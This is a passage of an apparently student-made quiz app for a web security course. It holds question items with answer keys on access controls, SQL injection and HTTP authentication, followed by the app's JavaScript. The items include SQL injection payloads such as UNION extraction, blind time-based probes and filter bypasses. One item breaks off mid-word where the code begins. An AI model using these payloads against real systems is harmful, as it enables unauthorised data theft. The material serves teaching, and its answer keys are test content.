PUT/PATCH requests to demonstrate write access, which is more impactful than read-only access", "Stop testing immediately — accessing another user's document has already proven the vulnerability, and further testing could cause legal issues"], "a": 0, "e": "The slides explicitly say: 'If access controls are found to be broken, and resource identifiers are found to be predictable, mount an automated attack to harvest sensitive resources.' Document full scope."}, {"t": "W10. Access Controls", "tp": "scenario", "q": "A servlet is invoked with <code>POST /svc</code> and the body <code>servlet=com.ibm.ws.webcontainer.httpsession.IBMTrackerDebug</code>. Why is this a concern?", "o": ["The servlet parameter is passed in the request body rather than the URL, which means it cannot be discovered through URL enumeration or web crawling", "The POST method is used instead of GET, which means the servlet can only be accessed by automated tools and not by regular browser users", "The IBM class path indicates the application is running on an outdated version of WebSphere that has known authentication bypass vulnerabilities", "The servlet name follows Java naming conventions, suggesting a debug/troubleshooting endpoint that should be restricted to admins but is reachable via normal HTTP"], "a": 3, "e": "Debug endpoints like IBMTrackerDebug are meant for admins, not internet users. Look for parameters following Java naming conventions (com.package.ClassName) that expose internal functionality."}, {"t": "W10. Access Controls", "tp": "multi", "q": "When testing access controls with only one low-privilege account, which techniques should you use?", "o": ["Add parameters like admin=true to URL query strings and POST request bodies to test for parameter-based access control", "Review all client-side HTML and JavaScript to find references to hidden functionality, admin URLs, or client-side access control logic", "Attempt to discover resource identifiers for unauthorized resources and test whether they follow predictable sequential patterns", "Test whether the application uses the HTTP Referer header for access control decisions by removing or modifying the header"], "m": [0, 1, 2, 3], "e": "All four techniques from the slides. With limited access: test parameters, test Referer, review client code, enumerate identifiers. If access controls are broken and IDs are predictable, automate harvesting."}, {"t": "W10. Access Controls", "tp": "mcq", "q": "The slides list three categories of insecure access control methods: parameter-based, Referer-based, and location-based. What do they all have in common?", "o": ["They all require the attacker to compromise the server's database before the access control can be bypassed or circumvented", "They all rely on server-side session state that can be manipulated by exploiting race conditions in concurrent request handling", "They all base access control decisions on conditions that are within the attacker's control and easily spoofed with an intercepting proxy", "They all use cryptographic verification mechanisms that have known theoretical weaknesses but are considered practically secure"], "a": 2, "e": "Parameters, Referer headers, and client IP/geolocation are all client-controlled or client-spoofable. An intercepting proxy can modify any of them."}, {"t": "W10. Access Controls", "tp": "scenario", "q": "Platform access rules specify: 'POST to /admin/* → admin role only'. A tester submits a GET request to <code>/admin/createUser</code> with a low-privilege account and the user is created. What went wrong?", "o": ["The tester's session was automatically elevated to admin when they accessed a URL path starting with /admin/ due to directory-based role inheritance", "The platform rules only restricted POST requests — GET, HEAD, and other methods were not covered, allowing the action to execute without admin authorization", "The application's WAF blocked the POST but the backend server processed the GET directly, as WAF rules and application rules are evaluated independently", "The GET method triggered a different code path that has its own separate authentication mechanism bypassing the platform rules entirely"], "a": 1, "e": "Platform rules must cover ALL HTTP methods. Test: change POST to GET, HEAD, PUT, DELETE, PATCH, and arbitrary invalid methods. If any work with low-priv accounts, the platform config is flawed."}, {"t": "W11. SQL Injection", "tp": "scenario", "q": "The slides use a food-delivery platform example. The query is: <code>SELECT id, fname, lname, salary FROM riders WHERE lname='[input]' AND id=100</code>. An attacker inputs <code>John' OR 1=1 --</code>. What is returned?", "o": ["Only the record for a rider named John with ID 100, since the OR condition is overridden by the AND clause that follows it", "The salaries of ALL riders in the database — the OR 1=1 tautology makes the WHERE clause match every row, and -- comments out the AND id=100", "Only the record for rider John — the 1=1 condition is evaluated as a string comparison and does not affect the boolean logic of the WHERE clause", "An empty result set because the comment -- is not valid syntax in the DBMS used by the food-delivery platform application"], "a": 1, "e": "WHERE lname='John' OR 1=1 -- AND id=100 → the OR 1=1 makes every row match, -- removes the AND restriction. All rider salaries exposed."}, {"t": "W11. SQL Injection", "tp": "mcq", "q": "In MySQL, which character can be used as an alternative to <code>--</code> for starting a SQL comment?", "o": ["The backslash (\\) which functions as both an escape character and a comment initiator in MySQL queries", "The forward slash (/) which starts a block comment when used alone without the asterisk in MySQL", "The hash/hashtag character (#) which marks the beginning of a single-line comment in MySQL syntax", "The semicolon (;) which terminates the current statement and causes the database to ignore everything that follows"], "a": 2, "e": "In MySQL, # starts a comment. The slides show: John' OR 1=1 # as an alternative to John' OR 1=1 --. Both comment out the rest of the query."}, {"t": "W11. SQL Injection", "tp": "scenario", "q": "You don't know how many columns an INSERT statement has. The slides suggest trying: <code>foo') --</code>, then <code>foo', 1) --</code>, then <code>foo', 1, 1) --</code>, etc. Why use the value 1 at each position?", "o": ["Most databases implicitly cast integers to strings, and 1 is unlikely to violate constraints — if 1 fails, try 2000 which also casts to date types", "The value 1 is a universal primary key that exists in every table, ensuring the INSERT always references a valid foreign key relationship", "Using 1 at each position creates a unique fingerprint that can be identified in the database to confirm which injection attempt succeeded", "The value 1 triggers a special 'debug mode' in most databases that returns detailed schema information about the table structure"], "a": 0, "e": "Integer 1 implicitly casts to string in most DBs. If rejected, try 2000 (casts to dates too). Keep adding values until the INSERT succeeds — that's your column count."}, {"t": "W11. SQL Injection", "tp": "scenario", "q": "After a successful UNION attack reveals the schema via <code>information_schema.columns</code>, you find a table called 'dependents' with columns first_name, last_name, employee_id. What query extracts this data?", "o": ["' SELECT first_name, last_name, employee_id FROM dependents -- which directly queries the dependents table without needing UNION", "' UNION SELECT first_name, last_name, employee_id FROM dependents -- which retrieves all dependent records with their associated employee IDs", "' INSERT INTO dependents SELECT first_name, last_name FROM employees -- which copies employee data into the dependents table for extraction", "' UNION SELECT * FROM dependents -- which returns all columns regardless of the original query's column count or data types"], "a": 1, "e": "Once you have table/column names from information_schema, inject UNION SELECT targeting those specific columns. Match the original query's column count and data types."}, {"t": "W11. SQL Injection", "tp": "theory", "q": "The slides emphasize that multistage processes must be walked through completely when testing for SQLi. Why?", "o": ["Multistage processes are inherently immune to SQL injection because the data is validated at each transition between stages", "Each stage of a multistage process uses a different web application firewall rule set that must be individually bypassed", "Data may be gathered across several requests and only persisted to the database after all stages complete — testing individual requests misses these injection points", "Multistage forms use different SQL databases at each stage, and each database must be tested with its own dialect-specific payloads"], "a": 2, "e": "The slides say: 'You will miss many SQL injection vulnerabilities if you only submit crafted data within each individual request.' Complete the full flow to trigger database persistence."}, {"t": "W11. SQL Injection", "tp": "mcq", "q": "When testing ORDER BY injection, you supply increasing numbers (1, 2, 3...) as the sort parameter. What happens when the number exceeds the actual column count?", "o": ["The ORDER BY clause wraps around to column 1, creating an infinite loop that crashes the database connection thread", "The database creates a new temporary column filled with the supplied number and sorts by that column's constant value", "The query fails with an error — this error boundary reveals the exact number of columns in the result set", "The database silently ignores the invalid column number and returns results in the default sort order without any error indication"], "a": 2, "e": "If number > column count → error. This reveals the column count. Then confirm with: 1 ASC -- vs 1 DESC -- to verify you can inject further SQL after the ORDER BY value."}, {"t": "W11. SQL Injection", "tp": "mcq", "q": "The expression <code>67-ASCII('A')</code> equals 2 in SQL. Why is this useful for numeric injection testing?", "o": ["It triggers a type conversion error that causes the database to reveal its version number in the error message response", "It tests the database's arithmetic precision by using a subtraction that produces a non-integer result that must be rounded", "It uses a SQL-specific function (ASCII) that wouldn't work in a normal calculator — if the application returns the same result as inputting 2, it confirms SQL evaluation", "It demonstrates that the database supports Unicode character encoding, which is a prerequisite for advanced injection techniques"], "a": 2, "e": "A normal numeric parser would reject ASCII('A'). Only a SQL interpreter would evaluate it. If 67-ASCII('A') produces the same result as 2, the input is being processed as SQL. Further evidence beyond simple math like 1+1."}, {"t": "W11. SQL Injection", "tp": "scenario", "q": "You find a search field that returns many results when you submit the <code>%</code> character. What does this confirm?", "o": ["The input is being passed to a SQL query — % is the SQL wildcard that matches any string, so a LIKE clause returns all records", "The application has a broken encoding filter that converts % to a null byte, causing the query to return all records by default", "The application is vulnerable to SQL injection because % is a SQL injection payload that always bypasses the WHERE clause", "The application is using NoSQL instead of SQL, because the % character is the wildcard operator in MongoDB query syntax"], "a": 0, "e": "% is the SQL wildcard for LIKE clauses. Many results = input reaches SQL. This doesn't confirm injection yet — just that you should probe further. It's a reconnaissance step."}, {"t": "W11. SQL Injection", "tp": "theory", "q": "When a SQL injection payload uses string concatenation to construct input equivalent to benign data (e.g., <code>'||'FOO</code> in Oracle), what does an identical response confirm?", "o": ["The Oracle database is running in compatibility mode that accepts non-standard SQL syntax from other database vendors", "The application is vulnerable to SQL injection — the database evaluated the concatenation and produced the same result as submitting FOO directly", "The application correctly escaped the pipe characters and treated the input as a literal string value rather than SQL syntax", "The application is using Oracle as its backend database, since || is the Oracle-specific string concatenation operator"], "a": 1, "e": "If '||'FOO (Oracle), '+'FOO (MSSQL), or ' 'FOO (MySQL) produces the same response as simply submitting FOO, the input is being evaluated as SQL. This also helps identify the DBMS."}, {"t": "W11. SQL Injection", "tp": "multi", "q": "Which SQL injection attack types can be used against INSERT statements specifically?", "o": ["Injecting into the username field to control the values for all subsequent columns like ID and privilege level", "Using UNION SELECT to extract data from other tables through the INSERT statement's output", "Using the value 2000 instead of 1 when integer values are rejected, since many databases cast 2000 to date types", "Guessing the column count by incrementally adding values: foo') --, foo',1) --, foo',1,1) -- until the INSERT succeeds"], "m": [0, 2, 3], "e": "UNION extracts data from SELECT queries, not INSERT statements. The other three are specific INSERT injection techniques: control all column values, guess column count incrementally, and use 2000 for implicit date casting."}, {"t": "W12. SQLi Advanced", "tp": "scenario", "q": "An application returns only 'login successful' or 'login failed'. You inject <code>admin' AND 1=1 #</code> (success) and <code>admin' AND 1=2 #</code> (failure). What have you confirmed?", "o": ["The login succeeded because 'admin' is a valid username and 1=1 is always true, but this doesn't confirm SQL injection", "The AND conditions are being evaluated by the application's JavaScript validation layer before reaching the database server", "The application uses MySQL (# comment syntax) and is vulnerable to SQL injection — you can now use boolean conditions to extract data bit by bit", "The application is using parameterized queries that correctly handle the injected conditions without executing them as SQL"], "a": 2, "e": "1=1 → true → login works (admin exists). 1=2 → false → login fails (no rows returned). Different behavior for true vs false conditions = confirmed blind SQLi. Now extract data: AND ASCII(SUBSTRING(password,1,1))=113 etc."}, {"t": "W12. SQLi Advanced", "tp": "theory", "q": "In blind SQLi using conditional errors, why does the expression <code>SELECT 1/0 FROM dual</code> work for data extraction?", "o": ["The dual table doesn't exist in most databases, so the error comes from the missing table rather than the division by zero", "The 1/0 expression returns NULL instead of an error in most databases, and the application displays a different page for NULL responses", "The dual table contains a single row, so 1/0 is evaluated exactly once — the division by zero either causes an error (condition true) or is never evaluated (condition false)", "The expression 1/0 returns infinity in SQL, which causes a numeric overflow that triggers the database's error handling routine"], "a": 2, "e": "dual is a dummy table with one row. If the WHERE condition matches, 1/0 is evaluated → division by zero error. If the condition doesn't match, no rows → 1/0 is never evaluated → no error. Error/no-error = true/false."}, {"t": "W12. SQLi Advanced", "tp": "scenario", "q": "You're extracting the database version using time-based blind injection: <code>' UNION SELECT IF(ASCII(SUBSTRING(@@version,1,1))=49, BENCHMARK(5000000,SHA1('dummy')),NULL),NULL,NULL #</code>. The server responds slowly. What did you learn?", "o": ["The first character of the database version has ASCII value 49, which is '1' — the BENCHMARK caused a delay because the condition was true", "The BENCHMARK function failed to execute because the database doesn't support SHA1, and the delay is from the error handling routine", "The server is under heavy load and the slow response is unrelated to your injection — retry during off-peak hours for accurate results", "The NULL value in the third column caused the server to perform a full table scan, which is the actual source of the response delay"], "a": 0, "e": "IF condition is true → BENCHMARK executes SHA1 five million times → measurable delay. If you try ASCII value 50 ('2'), the server responds instantly. Confirms version starts with '1'."}, {"t": "W12. SQLi Advanced", "tp": "multi", "q": "The slides describe sqlmap's automated exploitation methodology. Which steps does sqlmap perform in order?", "o": ["If UNION fails, inject boolean conditions (AND 1=1, AND 1=2) to test for conditional response differences", "If boolean conditions fail, try conditional time delays to extract data when no behavioral differences exist", "Attempt UNION attacks by brute-forcing column count and finding varchar columns for data extraction", "Brute-force all parameters in the target request to locate SQL injection entry points"], "m": [0, 1, 2, 3], "e": "sqlmap's escalation path: brute-force params → UNION → boolean blind → time-based blind. It also concatenates multi-column results into a single varchar field when needed."}, {"t": "W12. SQLi Advanced", "tp": "scenario", "q": "A filter removes the keyword <code>SELECT</code> from input. You submit <code>SELSELECTECT</code>. After filtering, what remains?", "o": ["SELECT — the filter removes the inner 'SELECT', leaving the outer letters 'SEL' + 'ECT' which combine to form a valid SELECT keyword", "An empty string — the filter recursively removes all instances of SELECT including the newly formed one after the first pass", "SELSELECTECT — the filter fails because the nested keyword doesn't match the exact pattern it's looking for in the input", "SELSELECT — the filter only removes the first occurrence of SELECT and leaves the remaining characters unchanged"], "a": 0, "e": "SELSELECTECT → filter removes inner SELECT → SEL + ECT = SELECT. This is why naïve keyword removal fails. Recursive filtering would catch this but most implementations don't recurse."}, {"t": "W12. SQLi Advanced", "tp": "scenario", "q": "The slides show that when a filter blocks both <code>--</code> and whitespace, you can use <code>SELECT/*foo*/username,password/*foo*/FROM/*foo*/users</code>. What does <code>/*foo*/</code> do?", "o": ["It triggers a stored procedure named 'foo' that returns a space character, effectively inserting whitespace between the SQL keywords", "It is an inline SQL comment that the parser treats as whitespace — the database ignores the comment content and processes the surrounding keywords normally", "It creates a SQL variable named 'foo' that stores the whitespace character and is interpolated between the SQL keywords", "It is a MySQL-specific syntax extension that concatenates adjacent SQL keywords without requiring whitespace between them"], "a": 1, "e": "SQL inline comments /* */ are treated as whitespace by the SQL parser. The content inside (foo) is ignored. This bypasses whitespace filters while maintaining valid SQL syntax."}, {"t": "W12. SQLi Advanced", "tp": "theory", "q": "The slides describe the CHAR function as a way to bypass blocked characters. How does <code>CHAR(109)+CHAR(97)</code> help?", "o": ["It calls a stored character set conversion function that translates the input from Unicode to ASCII, bypassing encoding-based filters", "It creates a binary value that the database interprets as a column name, allowing injection into ORDER BY clauses without string literals", "It creates a two-character string 'ma' (ASCII 109='m', 97='a') without using any quote characters — bypassing filters that block single quotes", "It performs a mathematical addition that equals 206, which is used as a numeric parameter to bypass string-based input validation"], "a": 2, "e": "CHAR() constructs strings character by character from ASCII codes. No quotes needed. The slides show: 'ma' can be written as CHAR(109)+CHAR(97). Bypasses single-quote filters."}, {"t": "W12. SQLi Advanced", "tp": "scenario", "q": "A prepared statement in PHP uses: <code>$stmt = $db->prepare('SELECT * FROM users WHERE username = ? AND password = ?');</code>. An attacker enters <code>admin' --</code> as the username. What happens?", "o": ["The ? placeholder automatically escapes the single quote to admin'', but the -- comment is still processed as SQL by the database engine", "The database searches for a user literally named <code>admin' --</code> — the input is treated as data, not SQL, so the quote and comment have no special meaning", "The query bypasses the password check because the prepared statement still concatenates the -- comment into the SQL structure", "The prepared statement throws a syntax error because the single quote in the input conflicts with the placeholder's string boundaries"], "a": 1, "e": "This is exactly how parameterized queries prevent SQLi. The database receives the query template first (structure fixed), then the values separately (treated as literal data). admin' -- becomes just a weird username to search for."}, {"t": "W08. Authentication", "tp": "mcq", "q": "What is the first step in the HTTP authentication flow for both Basic and Digest?", "o": ["The server redirects the client to a dedicated login page where credentials are submitted via an HTML form", "The client sends credentials proactively in the first request before the server requests them", "The server responds with a 401 status code and a WWW-Authenticate header, challenging the client to provide credentials", "The client establishes a TLS handshake and embeds credentials in the certificate exchange process"], "a": 2, "e": "Both Basic and Digest start with: (1) Server returns 401 + WWW-Authenticate: Basic or Digest, (2) Client responds with Authorization header containing credentials, (3) If valid → access granted, session begins."}, {"t": "W08. Authentication", "tp": "scenario", "q": "A web application uses HTTP Basic auth over HTTPS. An attacker installs malware on the user's endpoint device. Can the attacker still obtain the credentials?", "o": ["No — the Authorization header is protected by a separate encryption layer that is independent of the TLS connection", "Yes — Basic auth credentials are only Base64-encoded (not encrypted), so endpoint malware can intercept them before TLS encryption or after TLS decryption in the browser", "No — HTTPS encrypts the credentials end-to-end, making them invisible to any software running on the client device", "Yes, but only if the malware has root/administrator privileges on the device; standard user-level malware cannot access HTTPS traffic"], "a": 1, "e": "The slides state: 'If it is in HTTPS, the credentials are encrypted BUT they can still be grabbed if malware is installed on the endpoint.' Base64 encoding provides zero security at the endpoint level."}, {"t": "W08. Authentication", "tp": "mcq", "q": "HTTP Digest authentication includes a server-generated <code>nonce</code> value in the challenge. What is its purpose?", "o": ["The nonce encrypts the password using symmetric key cryptography before it is transmitted to the server", "The nonce is the server's public key used to establish a Diffie-Hellman key exchange for the subsequent encrypted session", "The nonce prevents replay attacks — each authentication response is unique because it includes this one-time server-generated value in the hash computation", "The nonce serves as the session token after authentication completes, eliminating the need for cookies"], "a": 2, "e": "The Digest response hash includes the nonce (server-generated), cnonce (client-generated), nonce count (nc), and the password. This means each response is unique and cannot be replayed by an attacker who captures it."}, {"t": "W08. Authentication", "tp": "theory", "q": "The slides warn: 'Don't confuse hashing with full transport security' in the context of Digest auth. What does this mean?", "o": ["Digest auth's hashing makes HTTPS unnecessary because the hash cannot be reversed to recover the original password", "Hashing the password in Digest auth protects the credential, but without HTTPS the rest of the session (data, tokens, cookies) is still transmitted in cleartext and vulnerable to interception", "The warning refers to the risk of hash collisions that could allow an attacker to authenticate with a different password that produces the same hash", "Hashing is equivalent to transport security because both prevent attackers from reading the original password value"], "a": 1, "e": "Digest hides the password via hashing, but HTTPS is still needed to protect the session, prevent downgrade/MITM attacks, and encrypt all other transmitted data. Hashing one field ≠ securing the whole channel."}, {"t": "W08. Authentication", "tp": "mcq", "q": "HTTP Digest authentication is rarely used in modern web applications. What has largely replaced it?", "o": ["Client certificate authentication, which is now universally supported by all browsers and requires no server-side configuration", "HTML form-based authentication combined with session tokens, which offers more flexibility for custom login flows, MFA, and user experience", "HTTP Basic authentication with longer passwords, which provides equivalent security without the complexity of hash computation", "Kerberos ticket-based authentication, which has been adopted as the standard for all public-facing web applications"], "a": 1, "e": "The slides say: 'Digest is rarer today; many systems use forms + tokens instead.' Form-based auth gives developers full control over the login UI, error handling, MFA integration, and session management."}, {"t": "W08. Authentication", "tp": "multi", "q": "What are the characteristics of HTTP Basic authentication? (Select the TRUE statements)", "o": ["The server must be configured with HTTPS and rate limiting when Basic auth is used to provide adequate security", "Without HTTPS, credentials can be trivially sniffed from network traffic since Base64 is encoding, not encryption", "Credentials are protected by Base64 encryption, making them unreadable without the decryption key", "Simple to implement — just Base64-encode username:password and send in the Authorization header with each request"], "m": [0, 1, 3], "e": "Base64 is ENCODING, not encryption — anyone can decode it instantly. Basic auth is simple but must always be paired with HTTPS (to protect in transit) and rate limiting (to prevent brute force). The slides explicitly state: 'if you see Basic, enforce HTTPS + rate limiting.'"}, {"t": "W08. Authentication", "tp": "multi", "q": "What are the characteristics of HTTP Digest authentication? (Select the TRUE statements)", "o": ["The password itself is never sent over the network — only a hash digest computed with the server's nonce", "Digest provides complete transport security, making HTTPS unnecessary for protecting the authenticated session", "The challenge-response mechanism with nonces helps prevent replay attacks on captured authentication exchanges", "Digest is rarer today because HTML form-based authentication with session tokens is more flexible and widely adopted"], "m": [0, 2, 3], "e": "Digest hides the password via hashing but does NOT provide full transport security — HTTPS is still needed to protect session tokens, prevent MITM, and encrypt other data. That's the key distinction."}, {"t": "W08. Authentication", "tp": "mcq", "q": "Comparing HTTP Basic and Digest: which statement is correct?", "o": ["Digest is obsolete and provides no security advantages over Basic — they are functionally identical in all modern browsers", "Basic is more secure than Digest because Base64 encoding uses a 256-bit key that Digest's MD5 hashing cannot match", "Basic sends credentials in plaintext (Base64-encoded); Digest sends a hash — but both MUST use HTTPS because neither protects the session or other transmitted data", "Basic requires HTTPS but Digest does not, because Digest's hash-based response fully protects all data in transit"], "a": 2, "e": "Basic: Base64 (reversible encoding) → password exposed without HTTPS. Digest: hash with nonce (password hidden) → but session still exposed without HTTPS. Both need HTTPS. Digest adds a layer but doesn't replace TLS."}, {"t": "W08. Authentication", "tp": "scenario", "q": "You intercept this HTTP header: <code>Authorization: Basic dXNlcjpwYXNzd29yZA==</code>. What can you immediately determine?", "o": ["The header contains a Kerberos service ticket encoded in Base64 that was issued by the Key Distribution Center", "The application uses Basic authentication — decode the Base64 string to instantly recover the plaintext credentials (user:password)", "The application uses Digest authentication and the hash value dXNlcjpwYXNzd29yZA== must be cracked to recover the password", "The credentials are encrypted with AES and the Base64 string is the ciphertext that requires the server's key to decrypt"], "a": 1, "e": "Authorization: Basic + Base64 string = HTTP Basic auth. dXNlcjpwYXNzd29yZA== decodes to user:password. Instant credential recovery — this is why HTTPS is mandatory. No cracking needed."}, {"t": "W08. Authentication", "tp": "scenario", "q": "You see this header: <code>Authorization: Digest username=\"user\", realm=\"Restricted\", nonce=\"628adc4610757\", response=\"c1f1a86c...\"</code>. Can you recover the password?", "o": ["Yes — the nonce is the encryption key, and XORing it with the response field recovers the original password value", "Yes — the response field is Base64-encoded and decodes directly to the plaintext password just like Basic authentication", "No, but the realm field contains a hint about the password that significantly reduces the brute-force search space", "No — the response field is a hash digest computed from th function sh(a){const b=[...a];for(let i=b.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[b[i],b[j]]=[b[j],b[i]]}return b}
const T=[...new Set(Q.map(x=>x.t))];
let S={s:'home',sl:new Set(T),qs:[],ci:0,an:[],ms:new Set()};
function isM(q){return Array.isArray(q.m)}
function gQ(){return sh(Q.filter(x=>S.sl.has(x.t)))}
function cor(q,ans){if(isM(q)){if(!Array.isArray(ans))return false;const s=new Set(ans),c=new Set(q.m);if(s.size!==c.size)return false;for(const v of s)if(!c.has(v))return false;return true}return ans===q.a}
function r(){document.getElementById('app').innerHTML='';({home:rH,quiz:rQ,results:rR})[S.s](document.getElementById('app'))}
function rH(el){
const al=S.sl.size===T.length,cn=Q.filter(x=>S.sl.has(x.t)).length;
el.innerHTML=`<div class="hd"><h1>ICT2214 Web Security</h1><p>Interactive quiz revision \u00b7 <span class="mn">${Q.length} questions</span></p></div>
<div class="cl"><button class="sa" onclick="tA()">${al?'Deselect All':'Select All'}</button><span class="qn">${cn} questions selected</span></div>
<div class="tg">${T.map(t=>`<div class="tc ${S.sl.has(t)?'sl':''}" onclick="tT('${t}')"><span class="tn">${t.split('.')[0].trim()}</span><h3>${t.split('. ')[1]}</h3><span>${Q.filter(x=>x.t===t).length} questions</span></div>`).join('')}</div>
<div class="bg_"><button class="bt bp" onclick="go()" ${!S.sl.size?'disabled':''}>Start Quiz \u2192</button></div>`}
function rQ(el){
const q=S.qs[S.ci],n=S.qs.length,p=S.ci/n*100,d=S.an[S.ci]!=null,multi=isM(q),u=S.an[S.ci];
const uSet=multi&&Array.isArray(u)?new Set(u):new Set();
const cSet=multi?new Set(q.m):new Set([q.a]);
const tags={multi:'<span class="ms-tag">MULTI-SELECT</span>',scenario:'<span class="sc-tag">SCENARIO</span>',theory:'<span class="th-tag">THEORY</span>',mcq:''};
el.innerHTML=`<div class="qh"><span class="qt">${q.t}</span><span class="qp">${S.ci+1} / ${n}</span></div>
<div class="pb"><div class="pf" style="width:${p}%"></div></div>
<div class="qc"><h2>${q.q}${tags[q.tp]||''}</h2><div class="os">${q.o.map((o,i)=>{
let c='op';
if(d){c+=' ds';if(cSet.has(i))c+=' ok';else if(multi?uSet.has(i):u===i)c+=' no';else c+=' dm'}
else if(multi&&S.ms.has(i))c+=' sel';
return`<div class="${c}" onclick="${multi?(d?'':`mt(${i})`):(`pk(${i})`)}">
${multi?`<span class="cb">${d?(cSet.has(i)?'\u2713':(uSet.has(i)?'\u2717':'')):(S.ms.has(i)?'\u2713':'')}</span>`:`<span class="ol">${'ABCD'[i]}</span>`}
<span>${o}</span></div>`}).join('')}
${multi&&!d?`<button class="sub-btn" onclick="sm()" ${S.ms.size===0?'disabled':''}>Submit Answer</button>`:''}
</div>
${d?`<div class="ex"><strong>${cor(q,u)?'\u2713 Correct':'\u2717 Incorrect'}</strong> \u2014 ${q.e}</div>`:''}</div>
<div class="bg_">${d?(S.ci<n-1?`<button class="bt bp" onclick="nx()">Next \u2192</button>`:`<button class="bt bp" onclick="rs()">Results \u2192</button>`):''}
<button class="bt bs" onclick="rt()">\u27f2 Restart</button></div>`}
function rR(el){
const n=S.qs.length,c=S.an.filter((a,i)=>cor(S.qs[i],a)).length,p=Math.round(c/n*100),ci=2*Math.PI*76,of_=ci-p/100*ci;
let gc,gl;if(p>=85){gc='a';gl='Excellent'}else if(p>=70){gc='b';gl='Good'}else if(p>=50){gc='c';gl='Needs Work'}else{gc='f';gl='Review the Material'}
const bd={};S.qs.forEach((q,i)=>{if(!bd[q.t])bd[q.t]={c:0,t:0};bd[q.t].t++;if(cor(q,S.an[i]))bd[q.t].c++});
el.innerHTML=`<div class="rs"><div class="hd"><h1>Quiz Complete</h1></div>
<div class="sr"><svg viewBox="0 0 160 160"><circle class="bg2" cx="80" cy="80" r="76"/><circle class="fg" cx="80" cy="80" r="76" stroke-dasharray="${ci}" stroke-dashoffset="${of_}"/></svg>
<div class="st"><div class="nm">${p}%</div><div class="lb">${c} / ${n}</div></div></div>
<h2>${gl}</h2><div class="gd ${gc}">${p}%</div>
<div class="tb_"><h3>Topic Breakdown</h3>${Object.entries(bd).map(([t,d])=>{const tp=Math.round(d.c/d.t*100),cl=tp>=80?'var(--ok)':tp>=50?'var(--ac)':'var(--no)';
return`<div class="br"><span>${t}</span><span style="color:${cl}">${d.c}/${d.t} (${tp}%)</span></div>`}).join('')}</div>
<div class="bg_"><button class="bt bp" onclick="rt()">\u27f2 Try Again</button><button class="bt bs" onclick="hm()">\u2190 Topics</button></div></div>`}
function tT(t){S.sl.has(t)?S.sl.delete(t):S.sl.add(t);r()}
function tA(){S.sl=S.sl.size===T.length?new Set():new Set(T);r()}
function go(){S.qs=gQ();S.ci=0;S.an=[];S.ms=new Set();S.s='quiz';r();scrollTo(0,0)}
function pk(i){if(S.an[S.ci]!=null)return;S.an[S.ci]=i;r()}
function mt(i){if(S.an[S.ci]!=null)return;S.ms.has(i)?S.ms.delete(i):S.ms.add(i);r()}
function sm(){if(S.an[S.ci]!=null||S.ms.size===0)return;S.an[S.ci]=[...S.ms];S.ms=new Set();r()}
function nx(){S.ci++;S.ms=new Set();r();scrollTo(0,0)}
function rs(){S.s='results';r();scrollTo(0,0)}
function rt(){S.qs=gQ();S.ci=0;S.an=[];S.ms=new Set();S.s='quiz';r();scrollTo(0,0)}
function hm(){S.s='home';S.ms=new Set();r();scrollTo(0,0)}
r();
</script>
